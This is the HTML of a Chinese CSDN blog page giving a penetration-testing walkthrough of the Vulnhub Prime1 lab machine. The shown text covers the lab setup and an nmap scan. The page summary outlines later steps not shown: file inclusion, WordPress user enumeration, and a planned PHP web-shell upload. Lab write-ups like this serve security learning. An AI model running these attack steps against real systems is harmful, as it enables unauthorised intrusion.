@@ -1,0 +1,1914 @@
+    <!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <link rel="canonical" href="https://blog.csdn.net/2601_95816162/article/details/161020751"/>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="renderer" content="webkit"/>
+    <meta name="force-rendering" content="webkit"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+      <meta name="report" content='{"pid": "blog", "spm":"1001.2101"}'>
+    <meta name="referrer" content="always">
+    <meta http-equiv="Cache-Control" content="no-siteapp" /><link rel="alternate" media="handheld" href="#" />
+    <meta name="shenma-site-verification" content="5a59773ab8077d4a62bf469ab966a63b_1497598848">
+    <meta name="applicable-device" content="pc">
+    <link  href="https://g.csdnimg.cn/static/logo/favicon32.ico"  rel="shortcut icon" type="image/x-icon" />
+    <title>保姆级讲解攻击vulnhub的prime1-CSDN博客</title>
+        <script type="application/ld+json">
+          {"datePublished":"2026-05-12T19:31:27+08:00","@type":"Article","author":[{"@type":"Person","name":"2601_95816162","url":"https://blog.csdn.net/2601_95816162"}],"dateModified":"2026-05-13T17:03:34+08:00","@context":"https://schema.org","headline":"保姆级讲解攻击vulnhub的prime1"}
+        </script>
+    <script>
+      (function(){ 
+        var el = document.createElement("script"); 
+        el.src = "https://s3a.pstatp.com/toutiao/push.js?1abfa13dfe74d72d41d83c86d240de427e7cac50c51ead53b2e79d40c7952a23ed7716d05b4a0f683a653eab3e214672511de2457e74e99286eb2c33f4428830"; 
+        el.id = "ttzz"; 
+        var s = document.getElementsByTagName("script")[0]; 
+        s.parentNode.insertBefore(el, s);
+      })(window)
+    </script>
+        <meta name="keywords" content="linux,ubuntu,github">
+    <meta name="description" content="文章浏览阅读882次，点赞31次，收藏8次。本文记录了使用Kali Linux对Prime1靶机进行渗透测试的过程。通过nmap扫描发现靶机开放80和22端口，使用dirsearch和dirb工具扫描网站目录，发现secret.txt提示进行模糊测试。利用wfuzz工具找到index.php的file参数实现文件包含，获取到密码提示。通过wpscan扫描WordPress获取用户名victor，结合密码成功登录后台。最后利用上传接口准备上传PHP木马进行进一步渗透。整个过程展示了从信息收集、漏洞发现到权限提升的完整渗透测试流程。">
+              <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/release/blogv2/dist/pc/css/detail_enter-9a2a54b4c3.min.css">
+    <style>
+        #content_views pre{
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none; 
+            user-select: none; 
+        }
+        #content_views pre code{
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none; 
+            user-select: none; 
+        }
+    </style>
+    <script type="application/ld+json">{"@context":"https://ziyuan.baidu.com/contexts/cambrian.jsonld","@id":"https://blog.csdn.net/2601_95816162/article/details/161020751","appid":"1638831770136827","pubDate":"2026-05-12T16:28:20","title":"保姆级讲解攻击vulnhub的prime1-CSDN博客","upDate":"2026-05-12T19:31:27"}</script>
+        <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/release/blogv2/dist/pc/themesSkin/skin-number/skin-number-2c93789924.min.css">
+    <script src="https://g.csdnimg.cn/lib/jquery/1.12.4/jquery.min.js" type="text/javascript"></script>
+    <script src="https://g.csdnimg.cn/lib/jquery-migrate/1.4.1/jquery-migrate.js" type="text/javascript"></script>
+    <script type="text/javascript">
+        var isCorporate = false;
+        var username =  "2601_95816162";
+        var skinImg = "white";
+
+        var blog_address = "https://blog.csdn.net/2601_95816162";
+        var currentUserName = "";
+        var isOwner = false;
+        var loginUrl = "http://passport.csdn.net/account/login?from=https://blog.csdn.net/2601_95816162/article/details/161020751";
+        var blogUrl = "https://blog.csdn.net/";
+        var starMapUrl = "https://ai.csdn.net";
+        var inscodeHost = "https://inscode.csdn.net";
+        var paymentBalanceUrl = "https://csdnimg.cn/release/vip-business-components/vipPaymentBalance.js?v=2025122501";
+        var appBlogDomain = "https://app-blog.csdn.net";
+        var avatar = "https://i-avatar.csdnimg.cn/59813198865b4e51990e1bc3144e804e_2601_95816162.jpg!1";
+        var isCJBlog = false;
+        var isStarMap = false;
+        var articleTitle = "保姆级讲解攻击vulnhub的prime1";
+        var articleDesc = "文章浏览阅读882次，点赞31次，收藏8次。本文记录了使用Kali Linux对Prime1靶机进行渗透测试的过程。通过nmap扫描发现靶机开放80和22端口，使用dirsearch和dirb工具扫描网站目录，发现secret.txt提示进行模糊测试。利用wfuzz工具找到index.php的file参数实现文件包含，获取到密码提示。通过wpscan扫描WordPress获取用户名victor，结合密码成功登录后台。最后利用上传接口准备上传PHP木马进行进一步渗透。整个过程展示了从信息收集、漏洞发现到权限提升的完整渗透测试流程。";
+        var articleTitles = "保姆级讲解攻击vulnhub的prime1-CSDN博客";
+        var nickName = "小趴菜一只";
+        var articleDetailUrl = "https://blog.csdn.net/2601_95816162/article/details/161020751";
+        var vipUrlV = "https://mall.csdn.net/vip?vipSource=learningVip";
+        if(window.location.host.split('.').length == 3) {
+            blog_address = blogUrl + username;
+        }
+        var skinStatus = "White";
+        var blogStaticHost = "https://csdnimg.cn/release/blogv2/"
+          var payColumn = false
+    </script>
+        <meta name="toolbar" content='{"type":"0","fixModel":"1"}'>
+      <script ript src="https://g.csdnimg.cn/??fixed-sidebar/1.1.7/fixed-sidebar.js" type="text/javascript"></script>
+    <script src='//g.csdnimg.cn/common/csdn-report/report.js' type='text/javascript'></script>
+    <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/public/sandalstrap/1.4/css/sandalstrap.min.css">
+    <style>
+        .MathJax_Message, .MathJax_Preview{
+            display: none !important;
+        }
+    </style>
+    <script src="https://dup.baidustatic.com/js/ds.js"></script>
+      <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "lgtpix6r85");
+      </script>
+    <script src="/cdn_cgi_bs_bot/static/crypto.min.js"></script>
+    <script src="/cdn_cgi_bs_bot/static/bot-score-v1.js"></script>
+    <script src="/cdn_cgi_bs_captcha/static/js/waf_captcha_embedded_bs.js"></script>
+</head>
+  <body class="nodata  " style="">
+    <div id="toolbarBox" style="min-height: 48px;"></div>
+        <script>
+            var toolbarSearchExt = '{\"id\":161020751,\"landingWord\":[],\"queryWord\":\"\",\"tag\":[\"linux\",\"ubuntu\",\"github\"],\"title\":\"保姆级讲解攻击vulnhub的prime1\"}';
+        </script>
+    <script src="https://g.csdnimg.cn/common/csdn-toolbar/csdn-toolbar.js" type="text/javascript"></script>
+    <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+    <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/pc/css/blog_code-01256533b5.min.css">
+    <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/chart-3456820cac.css" />
+    <link rel="stylesheet" href="https://g.csdnimg.cn/lib/swiper/6.0.4/css/swiper.css" />
+    <script src="https://g.csdnimg.cn/lib/swiper/6.0.4/js/swiper.js" async></script>
+    <script>
+      var articleId = 161020751;
+      var annotationModuleBootstrapData = {
+        hasAnnotation: false,
+        totalCount: 0,
+        list: [],
+        categories: []
+      };
+      var annotationFeatureEnabled = false;
+
+
+        var privateEduData = [];
+        var privateData = [];
+      var crytojs = "https://csdnimg.cn/release/blogv2/dist/components/js/crytojs-ca5b8bf6ae.min.js";
+      var commentscount = 0;
+      var commentAuth = 2;
+      var curentUrl = "https://blog.csdn.net/2601_95816162/article/details/161020751";
+      var myUrl = "https://my.csdn.net/";
+      var isGitCodeBlog = false;
+      var vipActivityIcon = "";
+      var isOpenSourceBlog = false;
+      var isVipArticle = false;
+        var highlight = ["vulnhub","github","ubuntu","prime","linux","讲解","保姆","攻击","1","级"];//高亮数组
+        var isRecommendModule = true;
+          var isBaiduPre = true;
+          var baiduCount = 2;
+          var setBaiduJsCount = 10;
+        var viewCountFormat = 882;
+      var share_card_url = "https://app-blog.csdn.net/share?article_id=161020751&username=2601_95816162"
+      var mallVipUrl = "https://mall.csdn.net/vip?vipSource=article"
+      var vipArticleAbStyle = "t_1"
+      var vipArticleCpStyle = "t_1"
+      var detailheaderAbCommunity = "control"
+      var codeAiAbStyle = "exp1"
+      var runProjectDeepBlogAB = "isRunProject is false"
+      var gitcodeHighlightWordAB = "exp1"
+
+      var asideCknowsEntryAB = "exp1"
+      var deepblogUrl = ""
+        deepblogUrl = "https://deepblog.net?utm_source=blog_onekey_run";
+      var codeAiAbObjStyle = ""
+        codeAiAbObjStyle = "{\"control\":{\"title\":\"AI写代码\",\"destUrl\":\"https://trae.com.cn?utm_source=community&utm_medium=csdn&utm_campaign=daima\",\"imgUrl\":\"https://i-operation.csdnimg.cn/images/a5fff6f6c9f0464c9a46b130c972952b.png\"},\"exp1\":{\"title\":\"一键获取完整项目代码\",\"runClose\":true,\"destUrl\":\"https://inscode.net?utm_source=blog_code_block\",\"imgUrl\":\"https://i-operation.csdnimg.cn/images/4648c13ca82a446ea1bfb99876a27770.png\",\"blogUrl\":true},\"control_run_project\": {\"title\": \"运行项目并下载源码\",\"destUrl\": \"\",\"imgUrl\":\"https://i-operation.csdnimg.cn/images/46c457a2cf8b4b9b8f17a2ab71461d4a.png\"},\"control_deepblog\": {\"title\": \"AI生成项目\",\"destUrl\": \"https://inscode.net?utm_source=blog_code_block_fixed\",\"imgUrl\":\"https://i-operation.csdnimg.cn/images/9899ea0f099e4e4e8b1fcdb918a27fcd.png\",\"blogUrl\": false},\"exp2\":{\"title\":\"AI编程工具\",\"destUrl\":\"https://www.codebuddy.cn/work/?fromSource=gwzcw.13129862.13129862.13129862&utm_medium=cpc&utm_id=gwzcw.13129862.13129862.13129862\",\"imgUrl\":\"https://i-operation.csdnimg.cn/images/034b15f494eb444abc72cc544790ca5f.svg\"},\"exp3\":{\"title\":\"AI构建项目\",\"destUrl\":\"https://t.csdnimg.cn/9I17\",\"imgUrl\":\"https://i-operation.csdnimg.cn/images/bf18ebff2c3748d59ea0f95954bb4b4a.png\"}}";
+      var aiSideSegment = -1;
+        aiSideSegment = "16";
+      var articleType = 1;
+      var baiduKey = "";
+      var copyPopSwitch = true;
+      var needInsertBaidu = true;
+      var recommendRegularDomainArr = ["blog.csdn.net/.+/article/details/","download.csdn.net/download/","edu.csdn.net/course/detail/","ask.csdn.net/questions/","bbs.csdn.net/topics/","www.csdn.net/gather_.+/"]
+      var codeStyle = "";
+      var baiduSearchType = "";
+      var sharData = "{\"hot\":[{\"id\":1,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/a5f4260710904e538002a6ab337939b3.png\"},{\"id\":2,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/188b37199a2c4b74b1d9ffc39e0d52de.png\"},{\"id\":3,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/14ded358b631444581edd98a256bc5af.png\"},{\"id\":4,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/1470f23a770444d986ad551b9c33c5be.png\"},{\"id\":5,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/c329f5181dc74f6c9bd28c982bb9f91d.png\"},{\"id\":6,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/ccd8a3305e81460f9c505c95b432a65f.png\"},{\"id\":7,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/bc89d8283389440d97fc4d30e30f45e1.png\"},{\"id\":8,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/452d485b4a654f5592390550d2445edf.png\"},{\"id\":9,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/f8b9939db2ed474a8f43a643015fc8b7.png\"},{\"id\":10,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/6de8864187ab4ed3b1db0856369c36ff.png\"},{\"id\":11,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/673cc3470ff74072acba958dc0c46e2d.png\"},{\"id\":12,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/930c119760ac4491804db80f9c6d4e3f.png\"},{\"id\":13,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/15e6befb05a24233bc2b65e96aa8d972.png\"},{\"id\":14,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/2075fd6822184b95a41e214de4daec13.png\"},{\"id\":15,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/859b1552db244eb6891a809263a5c657.png\"},{\"id\":16,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/0be2f920f1f74290a98921974a9613fd.png\"},{\"id\":17,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/2e97e00b43f14afab494ea55ef3f4a6e.png\"},{\"id\":18,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/ff4ab252f46e444686f5135d6ebbfec0.png\"},{\"id\":19,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/ae029bbe99564e79911657912d36524f.png\"},{\"id\":20,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/b3ece39963de440388728e9e7b9bf427.png\"},{\"id\":21,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/6f14651a99ba486e926d63b6fa692997.png\"},{\"id\":22,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/83ceddf050084875a341e32dcceca721.png\"},{\"id\":23,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/b90368b8fd5d4c6c8c79a707d877cf7c.png\"},{\"id\":24,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/aeffae14ecf14e079b2616528c9a393b.png\"},{\"id\":25,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/c5a06b5a13d44d16bed868fc3384897a.png\"},{\"id\":26,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/08b697658b844b318cea3b119e9541ef.png\"},{\"id\":27,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/68ccb0b8d09346ac961d2b5c1a8c77bf.png\"},{\"id\":28,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/a2227a247e37418cbe0ea972ba6a859b.png\"},{\"id\":29,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/3a42825fede748f9993e5bb844ad350d.png\"},{\"id\":30,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/8882abc1dd484224b636966ea38555c3.png\"},{\"id\":31,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/4f6a5f636a3e444d83cf8cc06d87a159.png\"},{\"id\":32,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/1953ef79c56b4407b78d7181bdff11c3.png\"},{\"id\":33,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/c04a2a4f772948ed85b5b0380ed36287.png\"},{\"id\":34,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/5b4fecd05091405ea04d8c0f53e9f2c7.png\"},{\"id\":35,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/b89f576d700344e280d6ceb2a66c2420.png\"},{\"id\":36,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/1c65780e11804bbd9971ebadb3d78bcf.png\"},{\"id\":37,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/d590db2055f345db9706eb68a7ec151a.png\"},{\"id\":38,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/fe602f80700b4f6fb3c4a9e4c135510e.png\"},{\"id\":39,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/39ff2fcd31e04feba301a071976a0ba7.png\"},{\"id\":40,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/f9b61b3d113f436b828631837f89fb39.png\"},{\"id\":41,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/df1aca5f610c4ad48cd16da88c9c8499.png\"},{\"id\":42,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/d7acf73a1e6b41399a77a85040e10961.png\"},{\"id\":43,\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/b7f1b63542524b97962ff649ab4e7e23.png\"}],\"vip\":[{\"id\":1,\"vipUrl\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101150.png\",\"url\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101154.png\"},{\"id\":2,\"vipUrl\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101204.png\",\"url\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101208.png\"},{\"id\":3,\"vipUrl\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101211.png\",\"url\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101215.png\"},{\"id\":4,\"vipUrl\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101218.png\",\"url\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101220.png\"},{\"id\":5,\"vipUrl\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101223.png\",\"url\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220920101226.png\"},{\"id\":6,\"vipUrl\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220922100635.png\",\"url\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220922100639.png\"},{\"id\":7,\"vipUrl\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220922100642.png\",\"url\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220922100644.png\"},{\"id\":8,\"vipUrl\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220922100647.png\",\"url\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220922100649.png\"},{\"id\":9,\"vipUrl\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220922100652.png\",\"url\":\"https:\\/\\/img-home.csdnimg.cn\\/images\\/20220922100655.png\"},{\"id\":10,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/55de67481fde4b04b97ad78f11fe369a.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/bb2418fb537e4d78b10d8765ccd810c5.png\"},{\"id\":11,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/579c713394584d128104ef1044023954.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/f420d9fbcf5548079d31b5e809b6d6cd.png\"},{\"id\":12,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/75b7f3155ba642f5a4cc16b7baf44122.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/a9030f5877be401f8b340b80b0d91e64.png\"},{\"id\":13,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/0903d33cafa54934be3780aa54ae958d.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/2cd8c8929f5a42fca5da2a0aeb456203.png\"},{\"id\":14,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/949fd7c22884439fbfc3c0e9c3b8dee7.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/dafbea9bd9eb4f3b962b48dc41657f89.png\"},{\"id\":15,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/4119cfddd71d4e6a8a27a18dbb74d90e.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/c56310c8b6384d9e85388e4e342ce508.png\"},{\"id\":16,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/121575274da142bcbbbbc2e8243dd411.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/5013993de06542f881018bb9abe2edf7.png\"},{\"id\":17,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/4d97aa6dd4fe4f09a6bef5bdf8a6abcd.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/76f23877b6ad4066ad45ce8e31b4b977.png\"},{\"id\":18,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/fdb619daf21b4c829de63b9ebc78859d.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/a1abe5d27a5441f599adfe662f510243.png\"},{\"id\":19,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/676b7707bb11410f8f56bc0ed2b2345c.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/7ac5b467fbf24e1d8c2de3f3332c4f54.png\"},{\"id\":20,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/0becb8cc227e4723b765bdd69a20fd4a.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/fdec85b26091486b9a89d0b8d45c3749.png\"},{\"id\":21,\"vipUrl\":\"https:\\/\\/img-blog.csdnimg.cn\\/1a6c06235ad44941b38c54cbc25a370c.png\",\"url\":\"https:\\/\\/img-blog.csdnimg.cn\\/410a06cda2d44b0c84578f88275caf70.png\"}],\"map\":{\"hot\":\"热门\",\"vip\":\"VIP\"}}";
+        var commentListModule = ''
+      var canRead = true;
+      var blogMoveHomeArticle = false;
+      var showSearchText = "";
+      var articleSource = 1;
+      var articleReport = '{"pid": "blog", "spm":"1001.2101"}';
+        var baiduSearchChannel = 'pc_relevant'
+        var baiduSearchIdentification = '.235^v43^pc_blog_bottom_relevance_base3'
+        var distRequestId = '1779004798791_81523'
+        var initRewardObject = {
+          giver: currentUserName,
+          anchor: username,
+          articleId: articleId,
+          sign: ''
+        }
+        var isLikeStatus = false;
+        var isUnLikeStatus = false;
+        var studyLearnWord = "";
+        var unUseCount = 0;
+        var codeMaxSize = 0;
+        var overCost = true;
+        var isCurrentUserVip = false;
+        var contentViewsHeight = 0;
+        var contentViewsCount = 0;
+        var contentViewsCountLimit = 5;
+        var isShowConcision = false;
+        var lastTime = "2026-05-13 17:03:34"
+        var postTime = "2026-05-12 19:31:27"
+      var isCookieConcision = false
+      var isHasDirectoryModel = false
+      var isShowSideModel = false
+      var isShowDirectoryModel = true
+      function getCookieConcision(sName){
+        var allCookie = document.cookie.split("; ");
+        for (var i=0; i < allCookie.length; i++){
+          var aCrumb = allCookie[i].split("=");
+          if (sName == aCrumb[0])
+            return aCrumb[1];
+        }
+        return null;
+      }
+      if (getCookieConcision('blog_details_concision') && getCookieConcision('blog_details_concision') == 0){
+        isCookieConcision = true
+        isShowSideModel = true
+        isShowDirectoryModel = false
+      }
+    </script>
+        <div class="main_father clearfix d-flex justify-content-center " style="height:100%;">
+          <div class="container clearfix " id="mainBox">
+          <script>
+          if (!isCookieConcision) {
+            $('.main_father').removeClass('mainfather-concision')
+            $('.main_father .container').removeClass('container-concision')
+          } else {
+            $('#mainBox').css('margin-right', '0')
+          }
+          </script>
+          <main>
+<script type="text/javascript">
+    var resourceId =  "";
+    function getQueryString(name) {   
+      var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); //构造一个含有目标参数的正则表达式对象  
+      var r = window.location.search.substr(1).match(reg);  //匹配目标参数
+      if( r != null ) return decodeURIComponent( r[2] ); return '';   
+    }
+    function stripscript(s){ 
+      var pattern = new RegExp("[`~!@#$^&*()=|{}':;',\\[\\].<>/?~！@#￥……&*（）——|{}【】‘；：”“'。，、？%]") 
+      var rs = ""; 
+      for (var i = 0; i < s.length; i++) { 
+        rs = rs+s.substr(i, 1).replace(pattern, ''); 
+      } 
+      return rs;
+    }
+    var blogHotWords = stripscript(getQueryString('utm_term')).length > 1 ? stripscript(getQueryString('utm_term')) : ''
+</script>
+<div class="blog-content-box">
+  <div class="article-header-box" id="article-header-box">
+    <div class="article-header">
+      <div class="article-title-box">
+        <h1 class="title-article" id="articleContentId">保姆级讲解攻击vulnhub的prime1</h1>
+      </div>
+      <div class="article-info-box">
+          <div class="article-bar-top">
+              <div class="bar-content active">
+              <span class="article-type-text original">原创</span>
+
+              
+              <span class="time">已于&nbsp;2026-05-13 17:03:34&nbsp;修改</span>
+                <span class="border-dian">·</span>
+                <span class="read-count">置顶</span>
+                <span class="border-dian">·</span>
+                <span class="read-count">882 阅读</span>
+                <div class="read-count-box is-like like-ab-new" data-type="top">
+                  <span class="border-dian">·</span>
+                  <img class="article-read-img article-heard-img active" style="display:none" id="is-like-imgactive-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Active.png" alt="">
+                  <img class="article-read-img article-heard-img" style="display:block" id="is-like-img-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Black.png" alt="">
+                  <span class="read-count" id="blog-digg-num" style="color:;">
+                      31
+                  </span>
+                </div>
+                <span class="border-dian">·</span>
+                <a id="blog_detail_zk_collection" class="un-collection" data-report-click='{"mod":"popu_823","spm":"1001.2101.3001.4232","ab":"new"}'>
+                  <img class="article-collect-img article-heard-img un-collect-status isdefault" style="display:inline-block" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect2.png" alt="">
+                  <img class="article-collect-img article-heard-img collect-status isactive" style="display:none" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollectionActive2.png" alt="">
+                  <span class="get-collection">
+                      8
+                  </span>
+                </a>
+
+                    <span class="border-dian">·</span>
+                    <div class="href-article-edit-new">
+                      <span class="href-article-edit-click">CC 4.0 BY-SA版权</span>
+                      <div class="slide-content-box-new">
+                                  版权声明：本文为博主原创文章，遵循<a href="http://creativecommons.org/licenses/by-sa/4.0/" target="_blank" rel="noopener"> CC 4.0 BY-SA </a>版权协议，转载请附上原文出处链接和本声明。
+                      </div>
+                    </div>
+              </div>
+              <div class="operating active">
+              </div>
+          </div>
+          <div class="blog-tags-box">
+            <div class="tags-box artic-tag-box">
+                      <div class="article-tag">
+                        <span class="label">文章标签：</span>
+                      <p>
+                          <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"linux","ab":"new","extra":"{\"searchword\":\"linux\"}"}' data-report-view='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"linux","ab":"new","extra":"{\"searchword\":\"linux\"}"}' class="tag-link-new" href="https://so.csdn.net/so/search/s.do?q=linux&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank" rel="noopener">#linux</a>
+                          <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"ubuntu","ab":"new","extra":"{\"searchword\":\"ubuntu\"}"}' data-report-view='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"ubuntu","ab":"new","extra":"{\"searchword\":\"ubuntu\"}"}' class="tag-link-new" href="https://so.csdn.net/so/search/s.do?q=ubuntu&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank" rel="noopener">#ubuntu</a>
+                          <a rel="nofollow" data-report-query="spm=1001.2101.3001.4223" data-report-click='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"github","ab":"new","extra":"{\"searchword\":\"github\"}"}' data-report-view='{"mod":"popu_626","spm":"1001.2101.3001.4223","strategy":"github","ab":"new","extra":"{\"searchword\":\"github\"}"}' class="tag-link-new" href="https://so.csdn.net/so/search/s.do?q=github&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank" rel="noopener">#github</a>
+                      </p>
+                      </div>
+                <p class="community-name" id="community-name"></p>
+            </div>
+          </div>
+          <div class="up-time"><span>于&nbsp;2026-05-12 19:31:27&nbsp;首次发布</span></div>
+      </div>
+    </div>
+  </div>
+    <div id="blogHuaweiyunAdvert" class=""></div>
+    <article class="baidu_pl">
+        <div id="article_content" class="article_content clearfix">
+        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css">
+        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-a50b13a894.css">
+                <div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <p>环境&#xff1a;<br />
+攻击机&#xff1a;kali2025<br />
+靶机&#xff1a;由kali2025内置docke拉取vulhub的prime1<br />
+注&#xff1a;攻击机(192.168.85.135)和靶机&#xff08;192.168.85.133&#xff09;&#xff08;均为虚拟机&#xff09;在同一网段</p>
+<p>部署prime1后打开虚拟机为如下内容&#xff1a;<br />
+<img src="https://i-blog.csdnimg.cn/direct/db3055d7d6c544c2854dcfe97831008a.png" alt="在这里插入图片描述" /><br />
+获取到有效信息&#xff1a;password.txt,先记下后面有用<br />
+随后使用攻击机进行nmap扫描,确定ip与端口,因为攻击机和靶机在同一网段,所以直接扫攻击机的c段寻找靶机ip和开放端口(这个靶机环境默认只开启80和22端口所以很好找)<br />
+nmap 192.168.85.135/24<br />
